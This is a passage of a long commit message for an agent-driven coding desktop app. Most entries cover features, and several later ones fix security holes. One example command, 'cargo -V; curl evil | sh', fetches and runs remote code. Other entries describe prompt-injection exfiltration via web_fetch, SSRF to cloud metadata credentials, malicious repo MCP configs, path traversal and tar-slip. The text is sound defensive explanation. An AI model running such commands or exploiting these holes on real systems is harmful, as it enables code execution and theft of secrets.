Claude, and the cursor\nadapter answers cursor/ask_question ACP requests — though Cursor's\nbackend does not yet deal that tool to models on the ACP surface, so the\nhandler waits for their rollout. Additive protocol bump to 0.5:\nquestion.requested/question.resolved events and POST /v1/questions.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show file line numbers in edit tool diffs\n\nSnippet edits carry no position, so the engine resolves each old_string\nagainst the pre-edit worktree file when the call is announced and stores\na \"_line\" hint in the event args; patch payloads take their numbers from\nhunk headers and writes count from 1. The chat's diff rows gain old/new\ngutter columns, hidden when no position resolved.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the tab strip visible on the new-thread form\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Turn the Files tab into an expandable tree view\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the chat tail pinned when toggling cards at the bottom\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persist the side panel splitter widths across restarts\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add /skill slash-command completion to the composer\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Move settings from a separate window into an in-window screen\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add keyboard scrolling, unstick the chat tail pin, full-window settings\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Open files in the system editor and dock the file tree in a drawer\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Run cargo fmt\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the chat pinned to the tail when a prompt is submitted\n\nSubmitting a prompt scrolls to the bottom, but the tail pin kept dying\nmid-jump: the ListView re-derives viewport-y while re-measuring freshly\ninstantiated rows, and the viewport-y watcher mistook those adjustments\nfor user scrolls and ended following, leaving the new prompt below the\nfold. Only treat a move with the content height unchanged as a user\nscroll; layout-driven moves re-pin so the jump converges. Scrollbar\ndrags end following explicitly.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Stop test engines from clobbering the user's config.toml\n\nEngine::new defaulted its write-back path to the real config file, so\nany engine built from a synthetic config — the server e2e tests upsert\nproviders on Config::default() — persisted that config over the user's\nconfig.toml, wiping their provider list on every test run. Config\nwrite-back is now opt-in: only the server binary and `trouve serve`,\nwhich load the real file, point the engine back at it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Make vendor CLI logins open the right page, once, and retryably\n\nNeutralize $BROWSER for spawned login CLIs so the client opens the\nscraped URL through the desktop default browser; skip loopback URLs\n(codex's local redirect listener) when scraping, keeping the sender\nalive until a real URL appears; and re-present a pending login's URL\ninstead of refusing, so closing the browser tab isn't a dead end.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Refresh the model picker after a login completes\n\nLogging in can unlock backend models, but the login-success path only\nrefreshed the settings screen, so new models stayed hidden until the\napp restarted.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Catch the codex adapter up to the current app-server protocol\n\ncodex-cli 0.144 renamed several wire values and reshaped token usage:\napproval policy \"unlessTrusted\" is now \"untrusted\", thread/start's\nsandbox enum went kebab-case (turn/start's sandboxPolicy tag stays\ncamelCase), approval decisions are \"approved\"/\"denied\" instead of\n\"accept\"/\"decline\", and per-call usage moved under tokenUsage.last —\nwhich had zeroed out token stats and the context dial.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep one claude process per thread alive across turns\n\nEvery Claude Code turn paid the CLI's cold start, a transcript re-read,\nand an MCP bridge re-handshake because we ran claude -p once per prompt.\nTurns now feed a persistent per-thread process over stream-json stdin,\nwith the pool bounded by an LRU cap (3) and a 5-minute idle reaper —\nkilling a pooled process is always safe since the transcript is on disk\nand --resume restores it. A turn whose spawn-time config (model,\noptions, instructions, permission, bridge) or session id changed\nrespawns; cancellation kills the process outright, as before.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add Kilo Code preset with live gateway model discovery\n\nopenai-compat providers now fetch the gateway's /models listing\n(OpenRouter-style metadata: display names, context windows, per-token\npricing, tool capability) instead of listing nothing off api.openai.com,\nwhich the new kilocode preset needs to be usable. Compaction now\nconsults the live listing too and falls back to a conservative 100k\nwindow for unknown models — never compacting let gateway threads grow\nuntil requests failed.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add accessible theme support with font and motion preferences\n\nEvery UI color now resolves through a semantic Theme global; Rust owns\nfive built-in palettes (dark, light, high-contrast dark, colorblind\ndark/light) verified as units by a WCAG AA contrast test, which is also\nwhy individual colors can't be user-overridden. A new Appearance\nsettings section picks the theme, base font size (everything scales\nthrough Theme.fs()), UI font, and Reduce Motion (spinners become static\nglyphs); choices persist to appearance.json. Theme switches restyle the\nstd widgets, re-bake syntax-highlight and inline-code colors, and\nre-highlight the open file.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Report real codex context windows from live token usage\n\ncodex's model/list never includes context windows, so every model showed\na hardcoded 272k. The app-server does report the true window via\nthread/tokenUsage/updated (modelContextWindow), so carry it on Usage,\npersist it through turn.completed, overlay observed values onto the\nmodel catalog, and prefer it in the app's context dial.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Slim the sidebar footer to a settings gear icon\n\nReplace the labeled settings button with an icon button and drop the\nstatus line: its notices duplicated visible UI state, and the two real\nerror messages now go to the error banner instead.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Auto-refresh the diff panel and drop the manual button\n\nPoll session_diff every 2s and repaint only when the diff actually\nchanged, carrying collapsed files over by path. Picks up agent edits\nmid-turn and external edits without touching scroll state.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a per-file copy button to diff file headers\n\nEach header row gets a right-aligned copy icon that copies just that\nfile's raw diff segment, split from the full diff in alignment with the\nparser's file order.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a Pull Requests tab backed by a GitHub integration setting\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add MCP server management to settings with health checks and logs\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show subscription health in providers settings\n\nCodex answers live via account/rateLimits/read on its app-server (plan,\n5h/weekly usage windows, credits); Cursor and Claude entries carry a note\nthat those vendors do not share subscription data with third parties.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Separate the thread tab strip from the chat with a header bar\n\nThe tabs sat directly on the chat's background and blended into\nscrolling content; give them an elevated strip (panel background,\nbottom hairline, soft shadow) so the chat reads as a layer beneath.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pulse-dots activity indicator nested in the streaming Agent card\n\nReplace the stock spinner with three staggered accent dots (rise,\nswell, halo) and move the Processing/Thinking row inside the open\nAgent card's body so it reads as part of the response being populated.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Mount the trouve MCP bridge on Codex threads\n\nCodex ran with no MCP servers, so it always shelled out to rg instead\nof trouve's semantic search. Pass the bridge via thread/start-resume\nconfig.mcp_servers (search/find_related/ask_question; no approval gate\nsince Codex approvals are native RPCs) and make the search-preference\nguidance vendor-neutral so Codex receives it too.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Unify Modes and Models settings with mode CRUD and per-mode default models\n\nModes gain an optional default_model applied when a thread is created\nwithout an explicit model (request > mode default > global default).\nNew /v1/mode-infos and PUT/DELETE /v1/modes/{id} endpoints expose mode\nprovenance (builtin/customized/custom/workspace) and file-backed CRUD;\nthe settings screen replaces the two read-only sections with one that\nedits, adds, resets, and removes modes, with per-mode model pickers\nthat disable behind a \"Configure providers\" prompt when no models\nexist.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add local (offline) model support via a managed llama.cpp runtime\n\nA built-in \"local\" provider that works with zero configuration: trouve\ninstalls llama-server through the managed-CLI machinery (Vulkan build on\nLinux when the loader is present, Metal on macOS), downloads curated\nsingle-file GGUFs from HuggingFace with progress, labels each model by\nhardware fit (RAM/VRAM probe, Ollama-style heuristic), and lazily runs a\nhealth-checked llama-server sidecar behind the OpenAI-compat client.\nSettings gains a Local Models section; custom GGUF repos are the\npower-user escape hatch.\n\nAlso included: user MCP servers pass through to the Claude, Codex, and\nCursor backends; branch configs can disable inherited servers; the MCP\nsettings list is workspace-aware with an app-wide layer; and a right-panel\nMCP tab shows the session's effective merged config with provenance.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persistent per-thread prompt queues with edit, reorder, and delete\n\nSending while a turn runs now enqueues the prompt in a new SQLite\nqueued_prompts table instead of racing the session lock; a per-thread\ndispatcher drains the queue in order between turns, including on\nsessions that aren't currently open. Queue changes ride the event\nstream (thread.queue_updated), so clients replay to the live state.\n\nA panel above the composer lists queued prompts with inline editing,\ndrag-and-drop reordering (plus single-step arrows), and deletion.\nQueues never auto-run at startup — a crash may have cut the in-flight\nturn short — and a failed turn pauses its queue; the \"Send now\" pill\nresumes either case explicitly.\n\nProtocol 0.7: TurnAccepted.queued, /v1/threads/{id}/queue endpoints\n(list/reorder/dispatch) and /v1/queue/{id} (edit/delete).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* App icon, desktop entry, and Trouve window/process naming\n\nBrand the desktop app: branching-threads icon (window + hicolor theme),\na trouve.desktop entry with install script (Wayland compositors resolve\ntaskbar/titlebar icons through a desktop file matching the xdg app id,\nwhich Slint now sets explicitly), window title \"Trouve\", and the app\nbinary renamed trouve-app -> trouve.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Embed the MCP bridge in the server and remove trouve-cli\n\nThe stdio mcp-bridge subprocess is replaced by a streamable-HTTP MCP\nendpoint served directly by trouve-server (per-thread, tool/approval\nsurface via query params); Claude and Codex now connect over HTTP\ninstead of spawning a bridge binary. With the bridge gone, the unused\ntrouve-cli frontend is deleted along with the bridge_command provider\nconfig. Codex's rmcp client gates MCP tool calls behind\nmcpServer/elicitation/request; auto-accept for the trouve server (its\ntools are gated inside trouve) and route other servers' elicitations\nthrough the normal approval flow.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add an integrated terminal tab backed by a server-side PTY\n\nOne shell per session, spawned in its worktree via portable-pty and\nstreamed as base64 chunks over SSE (a side channel like files/diffs,\nnot the event log). slint-terminal gains an interactive TerminalGrid\nwidget with vt100 emulation, key/paste encoding, and scrollback; the\napp attaches lazily on first visit to the tab. Protocol 0.8.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Install lifecycle: progress, cancel, uninstall, and a local-models toggle\n\nDownloads (vendor CLIs, llama.cpp, GGUFs) now stream with byte progress\nshown as progress bars, and can be cancelled mid-transfer. Managed CLI\ninstalls and the llama.cpp runtime can be uninstalled; the runtime's\nUpdate button only shows when a newer build actually exists. Local\nmodels get a Switch that stops the sidecar and unregisters the \"local\"\nprovider (persisted in config.toml), plus a Restart button for the\nrunning llama-server. Protocol 0.9.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Desktop notifications for turns finishing, failing, or needing attention\n\nClient-side only: the controller already follows every opened thread's\nevent stream, so it pops a notify-rust toast when a turn completes,\nfails, or blocks on an approval/question — but only when the window is\nunfocused (sampled off the winit window by the geometry poll) or the\nthread isn't the one on screen. A freshness guard keeps history replay\nsilent, and on Linux clicking the toast raises the window and reopens\nthe session/thread. Preferences (master switch, per-event toggles,\nsound) live in a new settings section and persist to notifications.json.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Prompt attachments: images and files ride with messages (protocol 0.10)\n\nUploads are base64 in SendMessageRequest, stored server-side, and served\nat GET /v1/attachments/{id}. Images reach vendor agents natively (Claude\nbase64 blocks, Codex localImage, Cursor ACP image blocks); other files —\nand everything on text-only native providers — become path references\nthe agent reads with its tools. The composer gains an attach button,\nCtrl+V screenshot paste, and removable chips; queued prompts keep their\nattachments across restarts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Local models: HuggingFace search replaces the manual GGUF form (protocol 0.11)\n\nAdding a local model is now search-and-pick: GET /v1/local/search queries\nHF's GGUF repos, lists each repo's single-file quants with the same\nhardware-fit guidance as the catalog, and recommends the best quant for\nthis machine (never sub-3-bit). The settings model list is split into\n\"Your models\" and \"Recommended\" sections.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Automations: scheduled prompts that spin up sessions (protocol 0.12)\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* GitHub OAuth sign-in and download-speed readouts (protocol 0.13)\n\nIntegrations gains \"Sign in with GitHub\" via the OAuth device flow when a\ngithub_client_id is configured; tokens now resolve env > oauth > saved PAT\n> gh CLI, with the source labelled in settings.\n\nAll download progress lines (vendor CLIs, llama.cpp, local models) now show\na smoothed transfer rate, estimated client-side from consecutive polls.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Session activity indicator in the sidebar (protocol 0.14)\n\nSessions processing a prompt — visible, background-queued, or spawned by\nan automation — show a pulsing dot in the session list. The engine emits\nsession.activity server events as sessions wake/idle, and Session.active\ncarries initial state on fetch.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Automation templates for common development chores (protocol 0.15)\n\nGET /v1/automations/templates serves a static catalog — dependency\nupdates, security audit, lint sweep, coverage gaps, docs drift, TODO\ntriage, daily digest — and the Automations screen grows a \"Start from a\ntemplate\" section that pre-fills the create form.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Self-hosted GitHub Enterprise support (protocol 0.16)\n\nThe GitHub integration is now host-based: github.com is always present,\nand enterprise instances can be registered from Settings → Integrations\n(or [[github_enterprise]] in config.toml), each with its own auth —\nenv var, OAuth device flow against the instance, pasted PAT, or the gh\nCLI keyring. Sessions route PR calls to the host their origin remote\nlives on, using the /api/v3 base for enterprise hosts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Hand off history when swapping models mid-thread\n\nVendor sessions are now keyed by (thread, backend), so switching cursor →\nclaude → cursor resumes cursor's own session instead of starting blind\n(existing databases rebuild the table on open). Each row tracks how much\nof the transcript the backend has seen; the unseen part — everything for\na vendor joining mid-conversation, just the interleaved turns for one\nbeing resumed — is rendered into a capped digest prepended to its prompt.\nNative providers already rebuild from the stored transcript.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Migrate the workspace to Rust edition 2024\n\nThe only real behavior change was env::set_var/remove_var becoming\nunsafe — all six call sites are in tests and get safety comments. The\nrest is upside: clippy collapsed the nested if-lets the new edition's\nlet chains make redundant, plus the fmt fallout.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Scope the archived-sessions filter to its workspace\n\nThe funnel toggle flipped one global flag, so showing archived sessions\nin one workspace showed them everywhere. The controller now keeps a set\nof workspace ids, the toggle callback carries the header row it came\nfrom, and each header row feeds its own checkmark state to the popup.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Fit filters for the HuggingFace model search\n\nA \"Show:\" row of checkboxes under the search box filters results by how\ntheir GGUFs fit this machine — fits GPU / runs on CPU (both on by\ndefault) / too large (off, so unrunnable models now start hidden).\nFiltering is client-side over the fetched results, so toggling is\ninstant, and a status line notes when the filters hide everything.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show the prompt immediately; keep the pulse out of the previous turn\n\nThe user message event now precedes the compaction check (whose model\nprobe can spawn llama-server and load a model), and the Processing pulse\nonly nests in an Agent card belonging to the running turn.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show turn duration in the Agent card header\n\nComputed client-side from the persisted turn.started/completed envelope\ntimestamps, so durations survive restarts and history replays.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Move the session activity dot left of the session name\n\nA fixed-width slot in the row indent keeps titles aligned whether the\nsession is busy or not; the old placement hid the dot against the\nactions button.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add edit_file: surgical string-replace edits for native providers\n\nold_string must match exactly once (or set replace_all); native tool\nevents now carry the _line display hint so the UI diff numbers its\ngutter, which the renderer already understood for vendor edits.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add glob: recursive filename search for native providers\n\nBare patterns (\"*.rs\") match at any depth; results honour .gitignore\nand sort newest-first. Read-only modes allow it alongside grep.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add web_fetch: fetch a URL as readable text\n\nHTML converts via html2text; byte and return-size caps with offset\npaging keep huge pages from flooding the transcript.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add todo_write: the agent's task list as a chat checklist card\n\nState is per-worktree with merge-by-id updates; the tool result carries\nthe full list so the transcript always shows the current plan, and the\nUI renders it as a \"Todos (done/total)\" card with a checklist detail.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add background shell jobs: run_in_background, shell_output, shell_kill\n\nLong-running commands (dev servers, builds) no longer block the turn:\nshell returns a job id, output reads are incremental with optional\nwaiting, and jobs are capped in count, size, and lifetime and scoped\nto their worktree.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add apply_patch: the V4A patch envelope Codex models are trained on\n\nAdd/Update (with @@ anchors and Move to)/Delete sections in one call;\nthe whole patch validates before any file is written. The chat diff\nrenderer already understood this format.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* read_file returns images as vision content for multimodal models\n\nImage files come back as \"_images\"; the engine strips the base64 from\nthe event log (leaving a size summary) and attaches it to the provider\ntool-result message — native image blocks for Anthropic, data-URL\nimage parts for chat-completions and Responses transcripts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Composer @ file mentions: fuzzy path completion from the session worktree\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Bake in the shared GitHub OAuth app: one-click sign-in with zero config\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Thinking controls for local models: GPT-OSS effort levels, Qwen3 on/off toggle\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Reap leaked llama-servers via pidfile; let llama.cpp auto-fit VRAM\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* spawn_thread / spawn_session / spawn_output: agents can delegate to child agents\n\nEngine-served tools (bridged to vendor agents too): spawn_thread starts a\nchild on a new thread in the same session, spawn_session in a fresh\nworktree branched from the session's branch, and spawn_output collects\nstatus, last message and usage, optionally waiting. Guardrails: one level\nof depth, four concurrent children, inherited permission mode, read-only\nparents can't escalate. Read-only same-session children skip the session\nlock (and checkpointing) so they run concurrently with the parent's turn.\nSpawned threads carry a fork marker in the tab strip.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* search_transcript: recover history lost to compaction and handoff digests\n\nEngine-served tool (bridged to vendors too): query mode returns\nturn-stamped snippets from the event log across thread, session, or\nworkspace scope (never crossing workspaces); turn mode replays one turn's\nmessages in full. The compaction summary and digest truncation markers now\npoint at the tool, so models reach for it exactly when context was elided.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Canonicalize tool paths against the worktree root\n\nToolCtx::resolve only checked path components lexically, so a symlink\ncommitted to the worktree (git stores arbitrary targets) let every file\ntool read or write outside the sandbox — including in read-only modes,\nsince read_file is ungated. Canonicalize the deepest existing ancestor\nand require it to stay under the canonicalized worktree; dangling\nsymlinks fail resolution instead of being written through.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Key complex shell commands on the exact command string\n\nThe allow-list keyed every shell command on its first whitespace token\nwhile handing the whole string to sh -c, so one \"always approve\" for\ncargo unlocked `cargo -V; curl evil | sh`. Commands containing shell\nmetacharacters (chaining, substitution, redirection, escapes) now key\non the exact command string; only metacharacter-free commands share\nthe first-token key.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Guard web_fetch against SSRF and gate it behind approval\n\nweb_fetch accepted any http(s) URL with no approval in any permission\nmode: reqwest followed redirects to anywhere, and nothing blocked\nloopback, link-local (cloud metadata), or private ranges — a zero-click\nexfiltration channel for prompt injection, and a path to credentials at\n169.254.169.254. Resolve and validate every hop's addresses, pin the\nconnection to the validated set so DNS can't rebind between check and\nconnect, follow redirects manually with re-validation, and require\nper-session approval for the tool in every permission mode.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Only auto-spawn MCP servers from the user's own config\n\nA repo's .agents/.mcp.json was discovered and its servers were spawned\nat the start of every turn — including plan/read-only turns — before any\napproval, and ${VAR} env values were expanded from the process\nenvironment into those commands. Cloning a malicious branch and starting\none turn was therefore arbitrary code execution plus secret\nexfiltration. Restrict auto-spawn (native turns, vendor CLIs, and the\nsettings probe) to servers whose winning definition comes from the\nuser's own config dir; repo-scoped servers (and user servers a branch\ntries to redefine) are listed as \"untrusted\" but never run.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Require a bearer token and loopback Host on the server API\n\nThe HTTP server drives an agent that runs shell commands and edits\nfiles, but had no authentication and no Host/Origin validation: any\nlocal process could drive it, and a web page could too via DNS\nrebinding. Add a ServerSecurity layer enforcing a per-launch bearer\ntoken on /v1 routes and rejecting non-loopback Host headers. The\nstandalone binary generates and persists the token (0600) or reads\nTROUVE_AUTH_TOKEN; the desktop app generates one and passes it to the\nserver it spawns. build_router stays open for in-process tests; serve\ngoes through build_secured_router. The internal MCP bridge stays exempt\nfrom the token (dialed by server-spawned children) but loopback-bound.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Repair dangling tool calls in the stored transcript\n\nA crash or restart between persisting an assistant message with\ntool_calls and persisting the tool results (execution can take minutes;\napproval waits are unbounded) left the transcript with a tool_call that\nhas no matching result. Both OpenAI and Anthropic reject that, so every\nfuture turn failed and the thread was permanently wedged. Sanitize the\ntranscript before each provider request: synthesize an \"interrupted\"\nresult for any unanswered call, and drop empty assistant messages (which\nserialize to an empty content block Anthropic also rejects). Stop\npersisting empty assistant messages in the first place.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Base compaction on the last request's input tokens, not the turn sum\n\nA turn re-sends the full transcript once per tool iteration, and usage\nwas summed across all of them. That sum was then reused as the\ncontext-size proxy for the compaction trigger, so a routine multi-tool\nturn on a small transcript reported many times the real context and\ncompacted a conversation nowhere near the window — a full-transcript\nsummary call per turn plus lost detail. Record the last request's input\n(input + cached) separately as the context proxy; keep the summed totals\nfor billing.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Decode SSE streams by complete line, not per network chunk\n\nAll four SSE parsers (Anthropic, OpenAI-compat, Codex Responses, and the\nclient event/terminal streams) decoded each network chunk with\nfrom_utf8_lossy before buffering. A multi-byte character split across a\nchunk boundary was replaced with U+FFFD on both sides, corrupting model\noutput and — when the split fell inside a streamed tool-call argument or\nan event envelope — invalidating the JSON so the call ran with null args\nor the event was dropped. Buffer raw bytes and decode only complete\nlines (split on \\n, never part of a multi-byte sequence).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Reconnect the app's thread event stream instead of freezing\n\nThe thread follower ran once and only logged when the stream ended, and\nthe followed set was never cleared so it couldn't restart. Any stream\ndrop (a server-side store error during replay, or the child server\nrestarting) left that thread's chat permanently stale — no deltas, tool\ncards, approval prompts, or turn-completion — until app relaunch. Loop\nwith a 2s backoff like the server-scope stream, resuming from the last\ncursor delivered (tracked in the closure so the error path resumes\ncorrectly) so nothing is replayed or lost.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Harden vendor CLI installs: validate versions, guard tar extraction\n\nVersion strings scraped from vendor endpoints flowed unvalidated into\nremove_dir_all/rename and download URLs, so a compromised endpoint\nreturning something like 1/../../etc could touch arbitrary directories.\nConstrain versions to a path-safe allowlist before use. Tarballs were\nunpacked with tar's default unpack(), which will write through a symlink\nentry pointing outside the target (tar-slip); validate every entry's\npath and link target for containment and reject escapes. Write\ninstalled.json atomically (temp + rename) so a crash mid-write can't\nleave a truncated pointer that reads as 'not installed'.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Skip checkpointing for lock-free backend children\n\nrun_backend_turn checkpointed unconditionally, but a read-only spawned\nchild running on a vendor backend model holds no session lock (it runs\nconcurrently with the parent turn by design). Its git add -A / write-tree\ntherefore raced the parent's in-flight git operations and snapshotted the\nparent's half-finished work as the child's checkpoint. Skip the\ncheckpoint for concurrent children, matching the native path and the\nper-session worktree serialization invariant.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Preserve Anthropic signed thinking blocks across tool use\n\nThe Anthropic stream discarded signature_delta and never replayed\nthinking blocks, but the Messages API rejects a follow-up tool-use turn\nwhose thinking blocks aren't preserved when extended thinking is on — so\nany thinking_level + tool call (i.e. every agent turn) got a 400,\nbreaking the advertised feature. Capture the signed thinking (and\nredacted_thinking) blocks as a new ProviderEvent::Reasoning, carry them\non Message::Assistant (opaque to other providers), and replay them\nverbatim at the head of the assistant turn.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Clamp code-view highlight spans to char boundaries\n\nsegment_parts sliced each line at highlighter byte offsets clamped only\nto line length. A tree-sitter span boundary landing inside a multi-byte\nUTF-8 character panics the slice — and this runs per visible line per\nrender, so one accented or emoji character in highlighted code crashed\nthe UI. Snap span offsets down to the nearest char boundary before\nslicing.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Delete attachments and spawned-thread rows with the session\n\ndelete_session removed events, messages, threads, and related rows but\nnot attachments or spawned_threads, both of which FK to threads(id) with\nforeign_keys=ON. Any session that ever took an attachment or spawned a\nchild failed the DELETE — after the engine had already removed the\nworktree and emitted SessionDeleted, leaving a zombie session gone from\ndisk but present in the DB. Delete both tables inside the transaction and\nremove attachment files from disk first.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Order event broadcast with cursor assignment; tolerate unknown events on replay\n\nTwo event-log robustness fixes. append_event assigned the cursor under\nthe connection lock but broadcast after releasing it, so two concurrent\nappends to one scope could publish out of order (6 before 5); live SSE\nsubscribers drop anything <= the last cursor seen, so event 5 was lost\nuntil reconnect. Broadcast under the same lock. Separately, events_after\npropagated a deserialization error for the whole scope, so a single event\nwritten by a newer build made the session/thread permanently unloadable;\nskip and log undeserializable rows instead.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Make append_checkpoint atomic\n\nThe redo-tail DELETE, the undo_pos reset, and the checkpoint INSERT ran\nas three separate statements, so a crash between them could drop the redo\ntail without recording the new checkpoint (leaving undo_pos NULL and a\nseq gap). Wrap them in one transaction.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Bound MCP requests, drop the lock across handshakes, and evict connections\n\nAn MCP tools/call had no timeout and held the pipe mutex while waiting,\nso a hung server wedged the turn (and its session lock) forever; the\nmanager also held its global connections lock across the untimed connect\nhandshake, so one misbehaving server blocked all MCP everywhere. Bound\nevery request (120s) and connect (30s), look up config and run the\nhandshake outside the connections lock, evict a connection after a failed\ncall so a crashed server reconnects instead of staying broken, and evict\na worktree's connections on session delete so their child processes don't\nleak.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Add turn cancellation (protocol 0.17)\n\nA running turn could not be interrupted: approval waits and MCP calls\nblocked indefinitely while holding the session lock, with no endpoint to\nstop them. Add POST /v1/threads/{id}/cancel and Engine::cancel_turn,\nbacked by a per-turn cancellation token the native and backend loops\nselect against — interrupting the provider/vendor stream, the in-flight\ntool call, and the approval wait at the next await point, and pausing the\nqueue with a new turn.cancelled event. Bumps the protocol to 0.17 and\nregenerates the OpenAPI snapshot.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Release the active-thread claim on dispatch error or panic\n\ndispatch_queue inserted the thread into active_threads, then called\nemit_queue and next_turn before spawning the dispatcher; if either\nfailed the claim leaked and the thread could never dispatch again. It\nalso leaked if the dispatcher task panicked (tokio swallows the panic),\nwedging the thread as permanently active with no TurnFailed event.\nRelease the claim on the setup error paths, and wrap the dispatcher in\ncatch_unwind to release the claim + cancel token and emit TurnFailed on\npanic.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate spawn tools by mode, fix spawn_session base, safe mode fallback, review mode\n\nFour related mode/spawn correctness fixes:\n- spawn_thread/spawn_session now respect the mode's allowed_tools (specs\n  and execution), so restrictive/read-only modes can't silently create\n  branches or child agents; the depth guard still takes precedence for\n  children.\n- spawn_session bases the child on the parent's latest checkpoint commit\n  instead of the session branch — checkpoints never move the branch, so\n  the child previously saw none of the parent's work.\n- An unresolvable thread mode (deleted/invalid TOML) now falls back to a\n  locked-down read-only mode, not the permissive code mode, so a thread\n  the user believed was restricted can't gain write access.\n- Review mode no longer advertises shell tools it can never run (it is\n  read_only, and the gate denies mutating tools there).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Stage native-provider attachments into the worktree so tools can read them\n\nAttachments were annotated into the prompt as absolute data-dir paths\nwith 'read them from disk', but the file tools reject absolute paths (the\nworktree sandbox), so read_file could never open them — attachments were\nunreachable on the native path. Copy them into a gitignored\n.trouve/attachments/ dir in the worktree and annotate worktree-relative\npaths the tools can actually open.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Serialize OAuth refresh; harden secrets file writes\n\nTwo credential-store fixes. bearer() did load/check/refresh/store with no\nsynchronization, so concurrent turns sharing an Arc'd token each POSTed\nthe same refresh_token — with rotating-refresh-token providers the reuse\nrevokes the whole family and logs the user out, and the racing set()s\nclobber each other; serialize refresh behind a mutex with a re-check.\nFileStore wrote secrets with std::fs::write (default umask, 